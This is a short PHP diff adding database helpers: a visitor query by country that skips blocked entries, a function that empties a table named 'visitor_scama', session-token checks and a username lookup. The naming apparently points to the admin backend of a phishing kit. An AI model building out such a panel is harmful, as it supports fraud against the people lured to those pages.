@@ -6,6 +6,8 @@ require_once('../vendor/autoload.php');
 $dotenv = Dotenv\Dotenv::createImmutable("../");
 $dotenv->load();
 
+use Firebase\JWT\JWT;
+
 require_once '../db/pdo.php';
 
 function getDomainshort()
@@ -114,16 +116,18 @@ function getVisitor()
     return $result;
 }
 
-function getVisitorBYcode($code)
+
+function getRealVisitorByCode($code)
 {
     global $conn;
-    $sql = "SELECT * FROM visitor WHERE code_country = :country";
+    $sql = "SELECT * FROM visitor WHERE code_country = :country AND blocked = 'NO'";
     $stmt = $conn->prepare($sql);
     $stmt->bindParam(':country', $code);
     $stmt->execute();
     $result = $stmt->fetchAll(PDO::FETCH_ASSOC);
     return $result;
 }
+
 
 function truncateVisitor()
 {
@@ -133,6 +137,13 @@ function truncateVisitor()
     $stmt->execute();
 }
 
+function truncateVisitorScam()
+{
+    global $conn;
+    $sql = "TRUNCATE TABLE visitor_scama";
+    $stmt = $conn->prepare($sql);
+    $stmt->execute();
+}
 
 function updatecookie()
 {
@@ -156,4 +167,44 @@ function ping($host, $port, $timeout)
     } else {
         return $ping;
     }
+}
+
+function verify_session()
+{
+    global $conn;
+
+    if (isset($_COOKIE['session_token'])) {
+        $sessionToken = $_COOKIE['session_token'];
+
+        $sql = "SELECT user_id FROM user_sessions WHERE session_token = :session_token";
+        $stmt = $conn->prepare($sql);
+        $stmt->bindParam(':session_token', $sessionToken);
+        $stmt->execute();
+        $session = $stmt->fetch(PDO::FETCH_ASSOC);
+
+        if ($session) {
+            // Update last_activity timestamp
+            $sql = "UPDATE user_sessions SET last_activity = NOW() WHERE session_token = :session_token";
+            $stmt = $conn->prepare($sql);
+            $stmt->bindParam(':session_token', $sessionToken);
+            $stmt->execute();
+
+            return $session['user_id'];
+        }
+    }
+    return false;
+}
+
+function get_user()
+{
+    global $conn;
+
+    $user_id = $_SESSION['user_id'];
+    $sql = "SELECT * FROM user WHERE iduser = :iduser";
+    $stmt = $conn->prepare($sql);
+    $stmt->bindParam(':iduser', $user_id);
+    $stmt->execute();
+    $user = $stmt->fetch(PDO::FETCH_ASSOC);
+
+    return $user['username'];
 }
